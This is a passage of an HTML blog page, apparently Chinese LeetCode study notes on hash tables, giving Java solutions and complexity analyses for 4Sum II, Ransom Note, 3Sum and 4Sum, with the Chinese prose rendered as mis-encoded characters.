nums1[0] + nums2[0] + nums3[0] + nums4[1] &#x3D; 1 + (-2) + (-1) + 2 &#x3D; 0</li><li>(1, 1, 0, 0) -&gt; nums1[1] + nums2[1] + nums3[0] + nums4[0] &#x3D; 2 + (-1) + (-1) + 0 &#x3D; 0</li></ol></blockquote><p>ç¤ºä¾‹ 2ï¼š</p><blockquote><p>è¾“å…¥ï¼šnums1 &#x3D; [0], nums2 &#x3D; [0], nums3 &#x3D; [0], nums4 &#x3D; [0]<br>è¾“å‡ºï¼š1</p></blockquote><p>ä¸»è¦æƒ³æ³•æ˜¯æŠŠå››ä¸ªæ•°ç»„ä¸¤ä¸¤åˆ’åˆ†ï¼Œè®¡ç®—å’Œä»¥åŠå‡ºç°çš„æ¬¡æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">fourSumCount</span><span class="params">(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2, <span class="type">int</span>[] nums3, <span class="type">int</span>[] nums4)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Integer, Integer&gt;();</span><br><span class="line">        <span class="comment">// ç»Ÿè®¡ä¸¤ä¸ªæ•°ç»„ä¸­çš„å…ƒç´ ä¹‹å’Œï¼ŒåŒæ—¶ç»Ÿè®¡å‡ºç°çš„æ¬¡æ•°ï¼Œæ”¾å…¥map</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : nums1)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j : nums2)&#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> i + j;</span><br><span class="line">                map.put(sum, map.getOrDefault(sum, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ç»Ÿè®¡å‰©ä½™çš„ä¸¤ä¸ªå…ƒç´ çš„å’Œï¼Œåœ¨mapä¸­æ˜¯å¦å­˜åœ¨ç›¸åŠ ä¸º0çš„æƒ…å†µï¼ŒåŒæ—¶ç»Ÿè®¡æ¬¡æ•°</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : nums3)&#123;</span><br><span class="line">            <span class="keyword">for</span>( <span class="type">int</span> j : nums4)&#123;</span><br><span class="line">                res += map.getOrDefault(<span class="number">0</span>-i-j, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¤æ‚åº¦åˆ†æ<br>æ—¶é—´å¤æ‚åº¦ï¼šO(n2)ã€‚æˆ‘ä»¬ä½¿ç”¨äº†ä¸¤æ¬¡äºŒé‡å¾ªç¯ï¼Œæ—¶é—´å¤æ‚åº¦å‡ä¸º O(n2)ã€‚åœ¨å¾ªç¯ä¸­å¯¹å“ˆå¸Œæ˜ å°„è¿›è¡Œçš„ä¿®æ”¹ä»¥åŠæŸ¥è¯¢æ“ä½œçš„æœŸæœ›æ—¶é—´å¤æ‚åº¦å‡ä¸º O(1)ï¼Œå› æ­¤æ€»æ—¶é—´å¤æ‚åº¦ä¸º O(n2)ã€‚<br>ç©ºé—´å¤æ‚åº¦ï¼šO(n2)ï¼Œå³ä¸ºå“ˆå¸Œæ˜ å°„éœ€è¦ä½¿ç”¨çš„ç©ºé—´ã€‚åœ¨æœ€åçš„æƒ…å†µä¸‹ï¼Œ<code>A[i]+B[j]</code> çš„å€¼å‡ä¸ç›¸åŒï¼Œå› æ­¤å€¼çš„ä¸ªæ•°ä¸º n2ï¼Œä¹Ÿå°±éœ€è¦ O(n2) çš„ç©ºé—´ã€‚</p><h2 id="383-èµé‡‘ä¿¡"><a href="#383-èµé‡‘ä¿¡" class="headerlink" title="383. èµé‡‘ä¿¡"></a>383. èµé‡‘ä¿¡</h2><p>ç»™ä½ ä¸¤ä¸ªå­—ç¬¦ä¸²ï¼šransomNote å’Œ magazine ï¼Œåˆ¤æ–­ ransomNote èƒ½ä¸èƒ½ç”± magazine é‡Œé¢çš„å­—ç¬¦æ„æˆã€‚<br>å¦‚æœå¯ä»¥ï¼Œè¿”å› true ï¼›å¦åˆ™è¿”å› false ã€‚<br>magazine ä¸­çš„æ¯ä¸ªå­—ç¬¦åªèƒ½åœ¨ ransomNote ä¸­ä½¿ç”¨ä¸€æ¬¡ã€‚</p><p>ç¤ºä¾‹ 1ï¼š<br>è¾“å…¥ï¼šransomNote &#x3D; â€œaâ€, magazine &#x3D; â€œbâ€<br>è¾“å‡ºï¼šfalse</p><p>ç¤ºä¾‹ 2ï¼š<br>è¾“å…¥ï¼šransomNote &#x3D; â€œaaâ€, magazine &#x3D; â€œabâ€<br>è¾“å‡ºï¼šfalse</p><p>ç¤ºä¾‹ 3ï¼š<br>è¾“å…¥ï¼šransomNote &#x3D; â€œaaâ€, magazine &#x3D; â€œaabâ€<br>è¾“å‡ºï¼štrue</p><p>å…¶å®ä¸»è¦è¿˜æ˜¯ç”¨å“ˆå¸Œè¡¨è®°å½•æœ‰å“ªäº›ï¼Œç„¶åéœ€è¦å“ªäº›ï¼Œå‡å»ä¹‹åå†æ£€æŸ¥å“ˆå¸Œè¡¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">canConstruct</span><span class="params">(String ransomNote, String magazine)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(ransomNote.length() &gt; magazine.length())&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// å®šä¹‰ä¸€ä¸ªå“ˆå¸Œæ˜ å°„æ•°ç»„</span></span><br><span class="line">        <span class="type">int</span>[] record =  <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">26</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// éå†</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">char</span> c : magazine.toCharArray())&#123;</span><br><span class="line">            record[c - <span class="string">&#x27;a&#x27;</span>] += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">char</span> c : ransomNote.toCharArray())&#123;</span><br><span class="line">            record[c - <span class="string">&#x27;a&#x27;</span>] -= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : record)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ç¬¬15é¢˜-ä¸‰æ•°ä¹‹å’Œ"><a href="#ç¬¬15é¢˜-ä¸‰æ•°ä¹‹å’Œ" class="headerlink" title="ç¬¬15é¢˜. ä¸‰æ•°ä¹‹å’Œ"></a>ç¬¬15é¢˜. ä¸‰æ•°ä¹‹å’Œ</h2><p>ç»™ä½ ä¸€ä¸ªæ•´æ•°æ•°ç»„ nums ï¼Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨ä¸‰å…ƒç»„ <code>[nums[i], nums[j], nums[k]]</code> æ»¡è¶³ i !&#x3D; jã€i !&#x3D; k ä¸” j !&#x3D; k ï¼ŒåŒæ—¶è¿˜æ»¡è¶³ <code>nums[i] + nums[j] + nums[k] == 0</code> ã€‚è¯·ä½ è¿”å›æ‰€æœ‰å’Œä¸º 0 ä¸”ä¸é‡å¤çš„ä¸‰å…ƒç»„ã€‚<br>æ³¨æ„ï¼šç­”æ¡ˆä¸­ä¸å¯ä»¥åŒ…å«é‡å¤çš„ä¸‰å…ƒç»„ã€‚</p><p>æ‹¿è¿™ä¸ªnumsæ•°ç»„æ¥ä¸¾ä¾‹ï¼Œé¦–å…ˆå°†æ•°ç»„æ’åºï¼Œç„¶åæœ‰ä¸€å±‚forå¾ªç¯ï¼Œiä»ä¸‹æ ‡0çš„åœ°æ–¹å¼€å§‹ï¼ŒåŒæ—¶å®šä¸€ä¸ªä¸‹æ ‡left å®šä¹‰åœ¨i+1çš„ä½ç½®ä¸Šï¼Œå®šä¹‰ä¸‹æ ‡right åœ¨æ•°ç»„ç»“å°¾çš„ä½ç½®ä¸Šã€‚<br>ä¾ç„¶è¿˜æ˜¯åœ¨æ•°ç»„ä¸­æ‰¾åˆ° abc ä½¿å¾—a + b +c &#x3D;0ï¼Œæˆ‘ä»¬è¿™é‡Œç›¸å½“äº <code>a = nums[i]ï¼Œb = nums[left]ï¼Œc = nums[right]</code>ã€‚<br>æ¥ä¸‹æ¥å¦‚ä½•ç§»åŠ¨left å’Œrightå‘¢ï¼Œ å¦‚æœ<code>nums[i] + nums[left] + nums[right] &gt; 0</code> å°±è¯´æ˜ æ­¤æ—¶ä¸‰æ•°ä¹‹å’Œå¤§äº†ï¼Œå› ä¸ºæ•°ç»„æ˜¯æ’åºåäº†ï¼Œæ‰€ä»¥rightä¸‹æ ‡å°±åº”è¯¥å‘å·¦ç§»åŠ¨ï¼Œè¿™æ ·æ‰èƒ½è®©ä¸‰æ•°ä¹‹å’Œå°ä¸€äº›ã€‚<br>å¦‚æœ <code>nums[i] + nums[left] + nums[right] &lt; 0</code> è¯´æ˜ æ­¤æ—¶ ä¸‰æ•°ä¹‹å’Œå°äº†ï¼Œleft å°±å‘å³ç§»åŠ¨ï¼Œæ‰èƒ½è®©ä¸‰æ•°ä¹‹å’Œå¤§ä¸€äº›ï¼Œç›´åˆ°leftä¸rightç›¸é‡ä¸ºæ­¢ã€‚<br>æ—¶é—´å¤æ‚åº¦ï¼šO(n^2)ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä½¿ç”¨åŒæŒ‡é’ˆæ³•è§£å†³</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">threeSum</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="comment">// æ‰¾å‡ºa + b + c = 0</span></span><br><span class="line">        <span class="comment">// a = nums[i], b = nums[left], c = nums[right]</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] &gt; <span class="number">0</span>) <span class="keyword">return</span> result;</span><br><span class="line">            <span class="keyword">if</span>(i &gt; <span class="number">0</span> &amp;&amp; nums[i] == nums[i-<span class="number">1</span>]) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> i + <span class="number">1</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span>(right &gt; left)&#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> nums[i] + nums[left] + nums[right];</span><br><span class="line">                <span class="keyword">if</span>(sum &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                    right--;</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(sum &lt; <span class="number">0</span>)&#123;</span><br><span class="line">                    left++;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    result.add(Arrays.asList(nums[i], nums[left], nums[right]));</span><br><span class="line">                    <span class="comment">// å»é‡é€»è¾‘åº”è¯¥æ”¾åœ¨æ‰¾åˆ°ä¸€ä¸ªä¸‰å…ƒç»„ä¹‹åå¯¹abcå»é‡</span></span><br><span class="line">                    <span class="keyword">while</span>(right&gt;left &amp;&amp; nums[right] == nums[right-<span class="number">1</span>]) right--;</span><br><span class="line">                    <span class="keyword">while</span>(right&gt;left &amp;&amp; nums[left] == nums[left + <span class="number">1</span>]) left++;</span><br><span class="line"></span><br><span class="line">                    right--;</span><br><span class="line">                    left++;</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨å“ˆå¸Œé›†åˆè§£å†³</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">threeSum</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="comment">// æ‰¾å‡ºa + b + c = 0</span></span><br><span class="line">        <span class="comment">// a = nums[i], b = nums[left], c = nums[right]</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] &gt; <span class="number">0</span>) <span class="keyword">return</span> result;</span><br><span class="line">            <span class="keyword">if</span>(i&gt;<span class="number">0</span> &amp;&amp; nums[i] == nums[i-<span class="number">1</span>])&#123;<span class="keyword">continue</span>;&#125;</span><br><span class="line"></span><br><span class="line">            HashSet&lt;Integer&gt; set = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=i+<span class="number">1</span>; j&lt;nums.length;j++)&#123;</span><br><span class="line">                <span class="comment">//ä¸‰å…ƒç»„å…ƒç´ bå»é‡</span></span><br><span class="line">                <span class="keyword">if</span>(j&gt;i+<span class="number">2</span> &amp;&amp; nums[j] == nums[j-<span class="number">1</span>] &amp;&amp; nums[j-<span class="number">1</span>] == nums[j-<span class="number">2</span>]) <span class="keyword">continue</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> -nums[i] - nums[j];</span><br><span class="line">                <span class="keyword">if</span>(set.contains(c))&#123;</span><br><span class="line">                    result.add(Arrays.asList(nums[i], nums[j], c));</span><br><span class="line">                    set.remove(c); <span class="comment">//ä¸‰å…ƒç»„å…ƒç´ cå»é‡</span></span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    set.add(nums[j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ç¬¬18é¢˜-å››æ•°ä¹‹å’Œ"><a href="#ç¬¬18é¢˜-å››æ•°ä¹‹å’Œ" class="headerlink" title="ç¬¬18é¢˜. å››æ•°ä¹‹å’Œ"></a>ç¬¬18é¢˜. å››æ•°ä¹‹å’Œ</h2><p>é¢˜æ„ï¼šç»™å®šä¸€ä¸ªåŒ…å« n ä¸ªæ•´æ•°çš„æ•°ç»„ nums å’Œä¸€ä¸ªç›®æ ‡å€¼ targetï¼Œåˆ¤æ–­ nums ä¸­æ˜¯å¦å­˜åœ¨å››ä¸ªå…ƒç´  aï¼Œbï¼Œc å’Œ d ï¼Œä½¿å¾— a + b + c + d çš„å€¼ä¸ target ç›¸ç­‰ï¼Ÿæ‰¾å‡ºæ‰€æœ‰æ»¡è¶³æ¡ä»¶ä¸”ä¸é‡å¤çš„å››å…ƒç»„ã€‚<br>æ³¨æ„ï¼š<br>ç­”æ¡ˆä¸­ä¸å¯ä»¥åŒ…å«é‡å¤çš„å››å…ƒç»„ã€‚<br>ç¤ºä¾‹ï¼š ç»™å®šæ•°ç»„ nums &#x3D; [1, 0, -1, 0, -2, 2]ï¼Œå’Œ target &#x3D; 0ã€‚ æ»¡è¶³è¦æ±‚çš„å››å…ƒç»„é›†åˆä¸ºï¼š [ [-1, 0, 0, 1], [-2, -1, 1, 2], [-2, 0, 0, 2] ]</p><p>å››æ•°ä¹‹å’Œï¼Œå’Œ15.ä¸‰æ•°ä¹‹å’Œ (opens new window)æ˜¯ä¸€ä¸ªæ€è·¯ï¼Œéƒ½æ˜¯ä½¿ç”¨åŒæŒ‡é’ˆæ³•, åŸºæœ¬è§£æ³•å°±æ˜¯åœ¨15.ä¸‰æ•°ä¹‹å’Œ (opens new window)çš„åŸºç¡€ä¸Šå†å¥—ä¸€å±‚forå¾ªç¯ã€‚<br>ä½†æ˜¯æœ‰ä¸€äº›ç»†èŠ‚éœ€è¦æ³¨æ„ï¼Œä¾‹å¦‚ï¼š ä¸è¦åˆ¤æ–­nums[k] &gt; target å°±è¿”å›äº†ï¼Œä¸‰æ•°ä¹‹å’Œ å¯ä»¥é€šè¿‡ nums[i] &gt; 0 å°±è¿”å›äº†ï¼Œå› ä¸º 0 å·²ç»æ˜¯ç¡®å®šçš„æ•°äº†ï¼Œå››æ•°ä¹‹å’Œè¿™é“é¢˜ç›® targetæ˜¯ä»»æ„å€¼ã€‚æ¯”å¦‚ï¼šæ•°ç»„æ˜¯[-4, -3, -2, -1]ï¼Œtargetæ˜¯-10ï¼Œä¸èƒ½å› ä¸º-4 &gt; -10è€Œè·³è¿‡ã€‚ä½†æ˜¯æˆ‘ä»¬ä¾æ—§å¯ä»¥å»åšå‰ªæï¼Œé€»è¾‘å˜æˆnums[i] &gt; target &amp;&amp; (nums[i] &gt;&#x3D;0 || target &gt;&#x3D; 0)å°±å¯ä»¥äº†ã€‚<br>15.ä¸‰æ•°ä¹‹å’Œ (opens new window)çš„åŒæŒ‡é’ˆè§£æ³•æ˜¯ä¸€å±‚forå¾ªç¯num[i]ä¸ºç¡®å®šå€¼ï¼Œç„¶åå¾ªç¯å†…æœ‰leftå’Œrightä¸‹æ ‡ä½œä¸ºåŒæŒ‡é’ˆï¼Œæ‰¾åˆ°nums[i] + nums[left] + nums[right] &#x3D;&#x3D; 0ã€‚<br>å››æ•°ä¹‹å’Œçš„åŒæŒ‡é’ˆè§£æ³•æ˜¯ä¸¤å±‚forå¾ªç¯nums[k] + nums[i]ä¸ºç¡®å®šå€¼ï¼Œä¾ç„¶æ˜¯å¾ªç¯å†…æœ‰leftå’Œrightä¸‹æ ‡ä½œä¸ºåŒæŒ‡é’ˆï¼Œæ‰¾å‡ºnums[k] + nums[i] + nums[left] + nums[right] &#x3D;&#x3D; targetçš„æƒ…å†µï¼Œä¸‰æ•°ä¹‹å’Œçš„æ—¶é—´å¤æ‚åº¦æ˜¯O(n^2)ï¼Œå››æ•°ä¹‹å’Œçš„æ—¶é—´å¤æ‚åº¦æ˜¯O(n^3) ã€‚<br>é‚£ä¹ˆä¸€æ ·çš„é“ç†ï¼Œäº”æ•°ä¹‹å’Œã€å…­æ•°ä¹‹å’Œç­‰ç­‰éƒ½é‡‡ç”¨è¿™ç§è§£æ³•ã€‚<br>å¯¹äº15.ä¸‰æ•°ä¹‹å’Œ (opens new window)åŒæŒ‡é’ˆæ³•å°±æ˜¯å°†åŸæœ¬æš´åŠ›O(n^3)çš„è§£æ³•ï¼Œé™ä¸ºO(n^2)çš„è§£æ³•ï¼Œå››æ•°ä¹‹å’Œçš„åŒæŒ‡é’ˆè§£æ³•å°±æ˜¯å°†åŸæœ¬æš´åŠ›O(n^4)çš„è§£æ³•ï¼Œé™ä¸ºO(n^3)çš„è§£æ³•ã€‚<br>ä¹‹å‰æˆ‘ä»¬è®²è¿‡å“ˆå¸Œè¡¨çš„ç»å…¸é¢˜ç›®ï¼š454.å››æ•°ç›¸åŠ II (opens new window)ï¼Œç›¸å¯¹äºæœ¬é¢˜ç®€å•å¾ˆå¤šï¼Œå› ä¸ºæœ¬é¢˜æ˜¯è¦æ±‚åœ¨ä¸€ä¸ªé›†åˆä¸­æ‰¾å‡ºå››ä¸ªæ•°ç›¸åŠ ç­‰äºtargetï¼ŒåŒæ—¶å››å…ƒç»„ä¸èƒ½é‡å¤ã€‚<br>è€Œ454.å››æ•°ç›¸åŠ II (opens new window)æ˜¯å››ä¸ªç‹¬ç«‹çš„æ•°ç»„ï¼Œåªè¦æ‰¾åˆ°A[i] + B[j] + C[k] + D[l] &#x3D; 0å°±å¯ä»¥ï¼Œä¸ç”¨è€ƒè™‘æœ‰é‡å¤çš„å››ä¸ªå…ƒç´ ç›¸åŠ ç­‰äº0çš„æƒ…å†µï¼Œæ‰€ä»¥ç›¸å¯¹äºæœ¬é¢˜è¿˜æ˜¯ç®€å•äº†ä¸å°‘ï¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">fourSum</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        Arrays.sort(nums); <span class="comment">// æ’åºæ•°ç»„</span></span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(); <span class="comment">// ç»“æœé›†</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>;k&lt;nums.length;k++)&#123;</span><br><span class="line">            <span class="comment">// å‰ªææ“ä½œ</span></span><br><span class="line">            <span class="keyword">if</span>(nums[k] &gt;target &amp;&amp; nums[k]&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// å¯¹nums[k]å»é‡</span></span><br><span class="line">            <span class="keyword">if</span>(k&gt;<span class="number">0</span> &amp;&amp; nums[k] == nums[k-<span class="number">1</span>])&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=k+<span class="number">1</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">                <span class="comment">// ç¬¬äºŒçº§å‰ªæ</span></span><br><span class="line">                <span class="keyword">if</span>(nums[k] + nums[i]&gt;target&amp;&amp;nums[k]+nums[i]&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// å¯¹nums[i]å»é‡</span></span><br><span class="line">                <span class="keyword">if</span>(i&gt;k+<span class="number">1</span> &amp;&amp; nums[i]==nums[i-<span class="number">1</span>])&#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> i+<span class="number">1</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.length-<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">while</span>(right&gt;left)&#123;</span><br><span class="line">                    <span class="type">long</span> <span class="variable">sum</span> <span class="operator">=</span> (<span class="type">long</span>)nums[k]+nums[i]+nums[left]+nums[right];</span><br><span class="line">                    <span class="keyword">if</span>(sum&gt;target)&#123;</span><br><span class="line">                        right--;</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(sum&lt;target)&#123;</span><br><span class="line">                        left++;</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        result.add(Arrays.asList(nums[k], nums[i], nums[left], nums[right]));</span><br><span class="line">                        <span class="comment">// å¯¹nums[left]å’Œnums[left]å»é‡</span></span><br><span class="line">                        <span class="keyword">while</span>(right&gt;left&amp;&amp;nums[right]==nums[right-<span class="number">1</span>])right--;</span><br><span class="line">                        <span class="keyword">while</span>(right&gt;left&amp;&amp; nums[left] ==nums[left+<span class="number">1</span>]) left++;</span><br><span class="line">                        right--;</span><br><span class="line">                        left++;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>åœ¨å…³äºå“ˆå¸Œè¡¨ï¼Œä½ è¯¥äº†è§£è¿™äº›ï¼ (opens new window)ä¸­ï¼Œæˆ‘ä»¬ä»‹ç»äº†å“ˆå¸Œè¡¨çš„åŸºç¡€ç†è®ºçŸ¥è¯†ï¼Œä¸åŒäºæ¯ç‡¥çš„è®²è§£ï¼Œè¿™é‡Œä»‹ç»äº†éƒ½æ˜¯å¯¹åˆ·é¢˜æœ‰å¸®åŠ©çš„ç†è®ºçŸ¥è¯†ç‚¹ã€‚<br>ä¸€èˆ¬æ¥è¯´å“ˆå¸Œè¡¨éƒ½æ˜¯ç”¨æ¥å¿«é€Ÿåˆ¤æ–­ä¸€ä¸ªå…ƒç´ æ˜¯å¦å‡ºç°é›†åˆé‡Œã€‚<br>å¯¹äºå“ˆå¸Œè¡¨ï¼Œè¦çŸ¥é“å“ˆå¸Œå‡½æ•°å’Œå“ˆå¸Œç¢°æ’åœ¨å“ˆå¸Œè¡¨ä¸­çš„ä½œç”¨ã€‚<br>å“ˆå¸Œå‡½æ•°æ˜¯æŠŠä¼ å…¥çš„keyæ˜ 